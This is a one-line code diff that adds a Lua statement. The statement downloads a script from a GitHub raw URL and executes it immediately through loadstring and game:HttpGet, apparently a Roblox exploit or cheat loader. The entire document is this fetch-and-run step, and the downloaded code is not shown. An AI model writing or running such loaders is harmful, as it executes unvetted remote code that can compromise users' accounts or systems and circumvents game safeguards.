@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/runaways-beta-spam7-6fl5pux1gwf2am.lua"))()
